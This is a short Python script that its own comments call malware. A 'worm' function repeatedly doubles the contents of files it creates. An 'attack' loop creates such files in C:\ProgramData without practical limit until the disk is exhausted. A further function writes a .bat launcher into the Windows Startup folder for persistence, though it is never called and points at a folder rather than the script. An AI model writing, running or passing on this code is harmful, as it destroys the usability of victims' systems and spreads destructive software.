import os
import getpass

def worm(filename):                                             #Defining the main part of the malware in which it self replicates
    myfile = open(filename, 'a+')
    myfile.write(".")
    text = ""

    try:
        while True:
            myfile.seek(len(text))
            text = myfile.read()
            myfile.write(text)
    except:                                                    #Except it throws memory error, it stops the function
        return 0


def attack():                                                    #Defining the attack
    for i in range(999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):
        worm(f'C:\\ProgramData\\.{i}')
attack()


                                                                #Adding it to the startup
USER_NAME = getpass.getuser()
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % file_path)